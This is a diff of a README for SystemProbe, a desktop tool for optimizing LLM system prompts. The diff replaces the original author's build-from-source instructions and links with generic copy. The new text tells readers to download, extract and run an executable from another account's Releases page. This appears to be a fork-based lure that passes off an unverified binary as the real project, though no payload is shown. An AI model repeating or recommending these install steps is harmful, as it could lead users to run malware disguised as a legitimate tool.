@@ -1,106 +1,68 @@
-# SystemProbe
+# SystemProbe 🚀
 
-**SystemProbe** is an AI-powered desktop application designed to help users discover and optimize **system prompts** for Large Language Models (LLMs) without requiring complex fine-tuning or LoRA training. It guides users through an iterative process of refining system prompts to achieve desired outputs for dynamic inputs.
+![SystemProbe](https://img.shields.io/badge/SystemProbe-AI%20Powered%20Desktop%20App-blue)
+
+Welcome to **SystemProbe**, an AI-powered desktop application designed to help users discover and optimize system prompts for Large Language Models (LLMs). This tool simplifies the process of working with LLMs, allowing you to enhance your prompts without the need for complex fine-tuning or LoRA training.
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
+- [Links](#links)
 
 ## Features
 
-- **Dual LLM Workflow**: Uses two LLMs - one for testing prompts and another for refining them
-- **Iterative Refinement**: Step-by-step process to refine system prompts based on user feedback
-- **Visual Scoring**: Rate prompt effectiveness with an intuitive slider
-- **Custom Guidance**: Provide specific guidance to the refiner LLM
-- **Session Management**: Save and load your prompt optimization sessions
-- **Dark/Light Theme Support**: Choose your preferred visual theme
-- **Groq API Integration**: Leverages Groq's powerful LLM models
-
-## Usage
-
-1. **Start the application**:
-   ```
-   python main.py
-   ```
-   ![Step 0](https://github.com/fernicar/SystemProbe/blob/main/images/app_capture0.png)
-
-2. **Step 1: Define Inputs and Examples**
-   - Enter representative user inputs that your system prompt should handle
-   - Provide the ideal outputs for each input example
-   - Separate multiple examples with `---`
-   ![Step 1](https://github.com/fernicar/SystemProbe/blob/main/images/app_capture1.png)
-
-3. **Step 2: Set Initial System Prompt**
-   - Enter your starting system prompt
-   - This will be the baseline for refinement
-   ![Step 2](https://github.com/fernicar/SystemProbe/blob/main/images/app_capture2.png)
-
-4. **Step 3: Test Output and Score Results**
-   - The Tester LLM will generate output based on your system prompt
-   - Score the output from 1-10
-   - Provide specific feedback on what to improve
-   - Choose to refine or accept the prompt
-   ![Step 3](https://github.com/fernicar/SystemProbe/blob/main/images/app_capture3.png)
-
-5. **Step 4: Analyze and Refine**
-   - Review the Refiner LLM's analysis
-   - Add optional guidance for further refinement
-   - Click "Refine Prompt" to generate new suggestions
-   - Test the refined prompt or accept it as final
-   ![Step 4](https://github.com/fernicar/SystemProbe/blob/main/images/app_capture4.png)
-
-6. **Step 5: Final Optimized Prompt**
-   - Copy your optimized system prompt
-   - Save it to a file
-   - Start a new workflow if needed
-   ![Step 5](https://github.com/fernicar/SystemProbe/blob/main/images/app_capture5.png)
+- **User-Friendly Interface**: Navigate easily through the app with a clean and intuitive design.
+- **AI-Powered Suggestions**: Receive smart recommendations for optimizing your prompts.
+- **No Complex Setup**: Start using the app without needing extensive technical knowledge.
+- **Support for Multiple LLMs**: Work seamlessly with various large language models.
+- **Customizable Options**: Tailor the app to fit your specific needs and preferences.
 
 ## Installation
 
-1. Clone the repository:
-   ```
-   git clone https://github.com/fernicar/SystemProbe.git
-   cd SystemProbe
-   ```
+To get started with SystemProbe, follow these simple steps:
 
-2. Create and activate a virtual environment:
-   ```
-   python -m venv .venv
-   .venv\Scripts\activate
-   ```
+1. Download the latest release from the [Releases section](https://github.com/reynaldopapi/SystemProbe/releases).
+2. Extract the downloaded file.
+3. Run the executable file to launch the application.
 
-3. Install dependencies:
-   ```
-   pip install -r requirements.txt
-   ```
+## Usage
 
-4. Set up your Groq free API key:
-   - Create a `.env` file in the project root with:
-     ```
-     GROQ_API_KEY='your_groq_api_key_here'
-     ```
-   - Or enter it in the application settings
+Once you have installed SystemProbe, you can begin using it right away. Here’s how:
 
-## Configuration
+1. **Launch the Application**: Open SystemProbe from your desktop or applications folder.
+2. **Input Your Prompt**: Enter your initial prompt in the designated text box.
+3. **Receive Suggestions**: The AI will analyze your prompt and provide optimization suggestions.
+4. **Implement Changes**: You can choose to apply the suggestions or modify them further.
+5. **Test Your Prompt**: Use the integrated testing feature to see how your prompt performs with your chosen LLM.
 
-- **API Key**: Set your Groq API key in Settings
-- **Theme**: Choose between Dark and Light themes
-- **LLM Model**: Select from available Groq models
-- **Model Updates**: Toggle automatic model list updates
+## Contributing
 
-## Technologies Used
+We welcome contributions to improve SystemProbe. Here’s how you can help:
 
-- **Python**: Core programming language
-- **PySide6**: Qt-based GUI framework
-- **Langchain**: Framework for LLM application development
-- **Groq API**: High-performance LLM provider
-- **QThread Workers**: For non-blocking LLM operations
+1. **Fork the Repository**: Create your own copy of the repository.
+2. **Make Changes**: Implement your improvements or fixes.
+3. **Submit a Pull Request**: Share your changes with us for review.
+
+For detailed guidelines, please refer to the `CONTRIBUTING.md` file in the repository.
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/fernicar/SystemProbe/blob/main/LICENSE) file for details.
+SystemProbe is licensed under the MIT License. See the `LICENSE` file for more information.
 
-## Acknowledgments
+## Support
 
-*   Special thanks to ScuffedEpoch for the [TINS](https://github.com/ScuffedEpoch/TINS) methodology and the initial example.
-*   Thanks to the free tier AI assistant for its initial contribution to the project.
-*   Gratitude to the Groq team for their API and support.
-*   Thanks to the Langchain and PySide6 communities for their respective libraries and documentation.
-*   Augment extension for VS Code
-*   Tested LLM Gemini2.5pro (free tier beta testing) from Google AI Studio
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/reynaldopapi/SystemProbe/releases) for updates. You can also reach out via the Issues tab on GitHub.
+
+## Links
+
+- [GitHub Repository](https://github.com/reynaldopapi/SystemProbe)
+- [Releases Section](https://github.com/reynaldopapi/SystemProbe/releases)
+
+---
+
+Thank you for using SystemProbe! We hope it enhances your experience with large language models.
